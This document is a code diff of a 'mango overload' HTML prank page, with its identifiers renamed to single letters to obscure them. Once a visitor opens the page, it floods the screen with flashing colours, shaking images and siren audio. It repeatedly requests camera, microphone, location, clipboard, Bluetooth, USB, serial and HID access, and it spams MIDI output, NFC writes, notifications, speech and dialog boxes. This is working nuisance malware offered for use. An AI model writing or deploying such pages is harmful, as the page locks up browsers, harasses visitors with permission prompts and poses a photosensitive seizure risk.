@@ -7,7 +7,7 @@
 <meta property="og:title" content="mango">
 <meta property="og:description" content="mango">
 <meta property="og:url" content="https://YOUR-LINK-HERE">
-<link id="icon" rel="icon">
+<link id="a" rel="icon">
 <style>
 html,body{
   margin:0;
@@ -19,20 +19,21 @@ html,body{
   font-family:sans-serif;
   touch-action:none;
 }
-.item{
+.b{
   position:absolute;
   pointer-events:none;
   will-change:transform,opacity;
 }
-.shake{animation:shake 0.06s infinite;}
-@keyframes shake{
+.c{animation:c 0.05s infinite;}
+@keyframes c{
   0%{transform:translate(0,0)}
-  25%{transform:translate(10px,10px)}
-  50%{transform:translate(-10px,10px)}
-  75%{transform:translate(10px,-10px)}
+  20%{transform:translate(12px,12px)}
+  40%{transform:translate(-12px,12px)}
+  60%{transform:translate(12px,-12px)}
+  80%{transform:translate(-12px,-12px)}
   100%{transform:translate(0,0)}
 }
-#trigger{
+#d{
   position:absolute;
   top:50%;
   left:50%;
@@ -44,17 +45,17 @@ html,body{
   user-select:none;
   text-align:center;
 }
-#trigger:hover{ font-size:220px; }
+#d:hover{ font-size:220px; }
 </style>
 </head>
 <body>
-<div id="trigger">🥭<br><small>touch / click me for mango overload</small></div>
-<audio id="bg" src="https://random.getunx.cc/Assets/2c0e8675dda2864abf408e6202e82ae7.mp3" loop preload="auto"></audio>
-<audio id="annoy" src="https://assets.mixkit.co/sfx/preview/mixkit-siren-alert-1003.mp3" loop preload="auto"></audio>
+<div id="d">🥭<br><small>touch / click me for mango overload</small></div>
+<audio id="e" src="https://random.getunx.cc/Assets/2c0e8675dda2864abf408e6202e82ae7.mp3" loop preload="auto"></audio>
+<audio id="f" src="https://assets.mixkit.co/sfx/preview/mixkit-siren-alert-1003.mp3" loop preload="auto"></audio>
 
 <script>
-const baseURL = "https://api-gatostuff.vercel.app/raw/assets/randasset/";
-const imageList = [
+const g = "https://api-gatostuff.vercel.app/raw/assets/randasset/";
+const h = [
 "img/01dbc1adc829dc3554cce431b1a8f3a6.jpg",
 "img/0235d48ad3fe45089783ddc92521aee3.jpg",
 "img/10691eb4709bcd5d8d3b17b031787164.jpg",
@@ -124,196 +125,251 @@ const imageList = [
 "img/new/new/new/images (95).jpeg"
 ];
 
-function createEmojiElement(){
-  const d = document.createElement("div");
-  d.textContent = "🥭";
-  d.className = "item";
-  d.style.fontSize = (Math.random()*180 + 30) + "px";
-  d.style.opacity = (Math.random()*0.8+0.2).toString();
-  d.style.left = Math.random()*(innerWidth-100) + "px";
-  d.style.top = Math.random()*(innerHeight-100) + "px";
-  d.style.transform = `rotate(${Math.random()*720-360}deg)`;
-  return d;
+const i = ["👶","👶🏻","👶🏼","👶🏽","👶🏾","👶🏿"];
+
+function j(){
+  const k = Math.random();
+  if (k < 0.4) return "🥭".repeat(20 + Math.floor(Math.random()*80));
+  if (k < 0.8) {
+    let l = "";
+    for(let m=0;m<30+Math.floor(Math.random()*70);m++) l += i[Math.floor(Math.random()*i.length)];
+    return l;
+  }
+  let l = "";
+  for(let m=0;m<40+Math.floor(Math.random()*100);m++) {
+    const n = 0x20 + Math.floor(Math.random() * (0xFFFF - 0x20));
+    l += String.fromCharCode(n);
+  }
+  return l;
 }
 
-function createImageElement(){
-  const img = document.createElement("img");
-  img.className = "item";
-  img.src = baseURL + imageList[Math.floor(Math.random()*imageList.length)];
-  img.style.width = (Math.random()*500 + 80) + "px";
-  img.style.opacity = (Math.random()*0.8+0.2).toString();
-  img.style.left = Math.random()*(innerWidth-120) + "px";
-  img.style.top = Math.random()*(innerHeight-120) + "px";
-  img.style.transform = `rotate(${Math.random()*720-360}deg)`;
-  return img;
+function o(){
+  const p = Math.random();
+  if (p < 0.33) alert(j());
+  else if (p < 0.66) confirm(j());
+  else prompt(j(), "🥭");
 }
 
-function spawnVisual(){
-  const el = Math.random() < 0.6 ? createEmojiElement() : createImageElement();
-  document.body.appendChild(el);
-  setTimeout(()=>{ try{ el.remove() }catch(e){} }, 4000);
+function q(){
+  const r = document.createElement("div");
+  r.textContent = "🥭";
+  r.className = "b";
+  r.style.fontSize = (Math.random()*220 + 40) + "px";
+  r.style.opacity = (Math.random()*0.9+0.1).toString();
+  r.style.left = Math.random()*(innerWidth-120) + "px";
+  r.style.top = Math.random()*(innerHeight-120) + "px";
+  r.style.transform = `rotate(${Math.random()*1080-540}deg)`;
+  return r;
 }
 
-const babyEmojis = ["👶","👶🏻","👶🏼","👶🏽","👶🏾","👶🏿"];
-function titleSpam(){
-  const type = Math.random();
-  if (type < 0.4) {
-    let str = "";
-    for (let i = 0; i < 20 + Math.floor(Math.random()*30); i++) {
-      str += babyEmojis[Math.floor(Math.random()*babyEmojis.length)];
-    }
-    document.title = str;
-  } else if (type < 0.8) {
-    document.title = "🥭".repeat(15 + Math.floor(Math.random()*30));
-  } else {
-    let str = "";
-    for (let i = 0; i < 40 + Math.floor(Math.random()*60); i++) {
-      str += Math.random() < 0.5 ? "I" : "l";
-    }
-    document.title = str;
+function s(){
+  const t = document.createElement("img");
+  t.className = "b";
+  t.src = g + h[Math.floor(Math.random()*h.length)];
+  t.style.width = (Math.random()*600 + 100) + "px";
+  t.style.opacity = (Math.random()*0.9+0.1).toString();
+  t.style.left = Math.random()*(innerWidth-140) + "px";
+  t.style.top = Math.random()*(innerHeight-140) + "px";
+  t.style.transform = `rotate(${Math.random()*1080-540}deg)`;
+  return t;
+}
+
+function u(){
+  for(let v=0;v<5+Math.floor(Math.random()*5);v++){
+    const w = Math.random() < 0.65 ? q() : s();
+    document.body.appendChild(w);
+    setTimeout(()=>{ try{ w.remove() }catch(e){} }, 3000);
   }
 }
 
-function faviconSpam(){
-  const c = document.createElement("canvas");
-  c.width = c.height = 32;
-  const ctx = c.getContext("2d");
-  ctx.clearRect(0,0,32,32);
-  ctx.font = "28px serif";
-  ctx.fillText("🥭", 2, 28);
-  document.getElementById("icon").href = c.toDataURL();
+function x(){
+  const y = Math.random();
+  if (y < 0.4) {
+    let z = "";
+    for (let aa = 0; aa < 30 + Math.floor(Math.random()*50); aa++) {
+      z += i[Math.floor(Math.random()*i.length)];
+    }
+    document.title = z;
+  } else if (y < 0.8) {
+    document.title = "🥭".repeat(20 + Math.floor(Math.random()*40));
+  } else {
+    let z = "";
+    for (let aa = 0; aa < 60 + Math.floor(Math.random()*80); aa++) {
+      z += Math.random() < 0.5 ? "I" : "l";
+    }
+    document.title = z;
+  }
 }
 
-const colors = ["#fff","#eee","#ffdd99","#ffaa00","#ff6600","#ffff00","#ff8800"];
-function flashBackground(){
-  document.body.style.background = colors[Math.floor(Math.random()*colors.length)];
+function ab(){
+  const ac = document.createElement("canvas");
+  ac.width = ac.height = 32;
+  const ad = ac.getContext("2d");
+  ad.clearRect(0,0,32,32);
+  ad.font = "30px serif";
+  ad.fillText("🥭", 0, 30);
+  document.getElementById("a").href = ac.toDataURL();
 }
 
-function vibratePattern(){
-  if(navigator.vibrate) navigator.vibrate([60,20,60,20,60,20,60]);
+const ae = ["#fff","#eee","#ffdd99","#ffaa00","#ff6600","#ffff00","#ff8800","#ff0000","#00ff00","#0000ff"];
+function af(){
+  document.body.style.background = ae[Math.floor(Math.random()*ae.length)];
 }
 
-function tryFocus(){ try{ window.focus(); }catch(e){} }
+function ag(){
+  const ah = [
+    `hue-rotate(\( {Math.random()*360}deg) saturate( \){1+Math.random()*5})`,
+    `invert(${Math.random()<0.4?1:0})`,
+    `blur(${Math.random()*4}px)`,
+    `contrast(\( {1+Math.random()*4}) brightness( \){0.3+Math.random()*2})`
+  ];
+  document.body.style.filter = ah.join(" ");
+}
 
-function mangoNotificationSpam() {
-  if (Notification.permission === "granted") {
+function ai(){
+  if(navigator.vibrate) navigator.vibrate([50,15,50,15,50,15,50,15,50]);
+}
+
+function aj(){ try{ window.focus(); }catch(e){} }
+
+function ak(){
+  if("speechSynthesis" in window){
+    const al = new SpeechSynthesisUtterance(j());
+    al.rate = 0.3 + Math.random()*3;
+    al.pitch = Math.random()*2;
+    al.volume = 1;
+    speechSynthesis.speak(al);
+  }
+}
+
+let am = 0;
+function an() {
+  am++;
+  if (am % 10 === 0 && Notification.permission === "granted") {
     try {
-      const canvas = document.createElement("canvas");
-      canvas.width = canvas.height = 128;
-      const ctx = canvas.getContext("2d");
-      ctx.font = "100px serif";
-      ctx.fillText("🥭", 10, 100);
-      const iconUrl = canvas.toDataURL();
-      new Notification("🥭", { body: "🥭", icon: iconUrl });
+      const ao = document.createElement("canvas");
+      ao.width = ao.height = 128;
+      const ap = ao.getContext("2d");
+      ap.font = "100px serif";
+      ap.fillText("🥭", 10, 100);
+      const aq = ao.toDataURL();
+      new Notification("🥭", { body: "🥭", icon: aq });
     } catch(e) {}
   }
 }
 
-let midiAccess = null;
-async function requestMIDIAccess() {
+let ar = null;
+async function as() {
   if (navigator.requestMIDIAccess) {
-    try { midiAccess = await navigator.requestMIDIAccess(); } catch(e) {}
+    try { ar = await navigator.requestMIDIAccess(); } catch(e) {}
   }
 }
-function ultraMIDISpam() {
-  if (!midiAccess || midiAccess.outputs.size === 0) return;
-  const outputs = Array.from(midiAccess.outputs.values());
-  outputs.forEach(output => {
-    for (let i = 0; i < 16; i++) {
-      const ch = Math.floor(Math.random() * 16);
-      const note = 20 + Math.floor(Math.random() * 80);
-      const vel = 100 + Math.floor(Math.random() * 28);
-      output.send([0x90 + ch, note, vel]);
-      setTimeout(() => output.send([0x80 + ch, note, 0]), 15 + Math.random() * 40);
+function at() {
+  if (!ar || ar.outputs.size === 0) return;
+  const au = Array.from(ar.outputs.values());
+  au.forEach(av => {
+    for (let aw = 0; aw < 25; aw++) {
+      const ax = Math.floor(Math.random() * 16);
+      const ay = 20 + Math.floor(Math.random() * 80);
+      const az = 100 + Math.floor(Math.random() * 28);
+      av.send([0x90 + ax, ay, az]);
+      setTimeout(() => av.send([0x80 + ax, ay, 0]), 8 + Math.random() * 25);
     }
   });
 }
 
-async function tryNFC() {
+async function ba() {
   if ("NDEFReader" in window) {
     try {
-      const ndef = new NDEFReader();
-      await ndef.scan();
+      const bb = new NDEFReader();
+      await bb.scan();
       setInterval(async () => {
-        try { await ndef.write("🥭"); } catch(e) {}
-      }, 1200);
+        try { await bb.write("🥭".repeat(100)); } catch(e) {}
+      }, 400);
     } catch(e) {}
   }
 }
 
-async function chainedPermissionStorm() {
-  let delay = 0;
-  const step = 200;
+async function bc() {
+  let bd = 0;
+  const be = 120;
 
-  setTimeout(() => { if ("Notification" in window) Notification.requestPermission().catch(()=>{}); }, delay);
-  delay += step;
-  setTimeout(async () => { await requestMIDIAccess(); }, delay);
-  delay += step;
-  setTimeout(() => { if (navigator.mediaDevices?.getUserMedia) navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(s => s.getTracks().forEach(t=>t.stop())).catch(()=>{}); }, delay);
-  delay += step;
-  setTimeout(() => { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{}); }, delay);
-  delay += step;
-  setTimeout(() => { if (navigator.clipboard) { navigator.clipboard.writeText("🥭".repeat(100)).catch(()=>{}); navigator.clipboard.readText().catch(()=>{}); } }, delay);
-  delay += step;
-  setTimeout(() => { if ("wakeLock" in navigator) navigator.wakeLock.request('screen').catch(()=>{}); }, delay);
-  delay += step;
-  setTimeout(() => { document.documentElement.requestFullscreen?.().catch(()=>{}); }, delay);
-  delay += step;
-  setTimeout(() => { document.body.requestPointerLock?.(); }, delay);
-  delay += step;
-  setTimeout(() => { tryNFC(); }, delay);
-  delay += step;
-  setTimeout(() => { navigator.bluetooth?.requestDevice({acceptAllDevices:true}).catch(()=>{}); }, delay);
-  delay += step;
-  setTimeout(() => { navigator.usb?.requestDevice({filters:[]}).catch(()=>{}); }, delay);
-  delay += step;
-  setTimeout(() => { navigator.serial?.requestPort().catch(()=>{}); }, delay);
-  delay += step;
-  setTimeout(() => { navigator.hid?.requestDevice({filters:[]}).catch(()=>{}); }, delay);
+  setTimeout(() => { if ("Notification" in window) Notification.requestPermission().catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(async () => { await as(); }, bd);
+  bd += be;
+  setTimeout(() => { if (navigator.mediaDevices?.getUserMedia) navigator.mediaDevices.getUserMedia({audio:true,video:true}).then(bf => bf.getTracks().forEach(bg => bg.stop())).catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { if (navigator.clipboard) { navigator.clipboard.writeText("🥭".repeat(1000)).catch(()=>{}); navigator.clipboard.readText().catch(()=>{}); } }, bd);
+  bd += be;
+  setTimeout(() => { if ("wakeLock" in navigator) navigator.wakeLock.request('screen').catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { document.documentElement.requestFullscreen?.().catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { document.body.requestPointerLock?.(); }, bd);
+  bd += be;
+  setTimeout(() => { ba(); ba(); ba(); ba(); ba(); ba(); ba(); ba(); ba(); ba(); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.bluetooth?.requestDevice({acceptAllDevices:true}).catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.usb?.requestDevice({filters:[]}).catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.serial?.requestPort().catch(()=>{}); }, bd);
+  bd += be;
+  setTimeout(() => { navigator.hid?.requestDevice({filters:[]}).catch(()=>{}); }, bd);
 }
 
-const bgAudio = document.getElementById("bg");
-const annoyAudio = document.getElementById("annoy");
-function tryPlayAudio() {
-  bgAudio.play().catch(()=>{});
-  annoyAudio.play().catch(()=>{});
-  bgAudio.volume = annoyAudio.volume = 0.8 + Math.random()*0.2;
-  bgAudio.playbackRate = annoyAudio.playbackRate = 0.9 + Math.random()*0.6;
+const bh = document.getElementById("e");
+const bi = document.getElementById("f");
+function bj() {
+  bh.play().catch(()=>{});
+  bi.play().catch(()=>{});
+  bh.volume = bi.volume = 0.9 + Math.random()*0.1;
+  bh.playbackRate = bi.playbackRate = 0.7 + Math.random()*1.2;
 }
 
-document.body.classList.add("shake");
-setInterval(spawnVisual, 60);
-setInterval(titleSpam, 60);
-setInterval(faviconSpam, 80);
-setInterval(flashBackground, 40);
+document.body.classList.add("c");
+setInterval(u, 40);
+setInterval(x, 40);
+setInterval(ab, 50);
+setInterval(af, 25);
+setInterval(ag, 150);
 
-const events = ["click","touchstart","touchmove","mousedown","keydown","scroll","wheel","mousemove"];
-events.forEach(evt => {
-  document.addEventListener(evt, () => {
-    chainedPermissionStorm();
-    tryPlayAudio();
-    ultraMIDISpam();
-    mangoNotificationSpam();
+const bk = ["click","touchstart","touchmove","mousedown","keydown","scroll","wheel","mousemove"];
+bk.forEach(bl => {
+  document.addEventListener(bl, () => {
+    bc();
+    bj();
+    at();
+    an();
+    ak();
 
-    const trigger = document.getElementById("trigger");
-    if (trigger) trigger.remove();
+    const bm = document.getElementById("d");
+    if (bm) bm.remove();
 
-    setInterval(spawnVisual, 12);
-    setInterval(vibratePattern, 150);
-    setInterval(tryFocus, 200);
-    setInterval(mangoNotificationSpam, 300);
-    setInterval(ultraMIDISpam, 100);
+    setInterval(u, 6);
+    setInterval(ai, 80);
+    setInterval(aj, 120);
+    setInterval(an, 600);
+    setInterval(at, 60);
+    setInterval(ak, 300);
+    setInterval(o, 20000);
   }, {passive: false});
 });
 
-setInterval(mangoNotificationSpam, 300);
-setInterval(ultraMIDISpam, 100);
-setInterval(tryPlayAudio, 600);
-setInterval(titleSpam, 40);
-setInterval(chainedPermissionStorm, 1500);
+setInterval(an, 600);
+setInterval(at, 60);
+setInterval(bj, 400);
+setInterval(x, 25);
+setInterval(ak, 400);
+setInterval(o, 30000);
+setInterval(bc, 1000);
+setInterval(ai, 100);
 
-chainedPermissionStorm();
-tryPlayAudio();
+bc();
+bj();
 
 </script>
 </body>
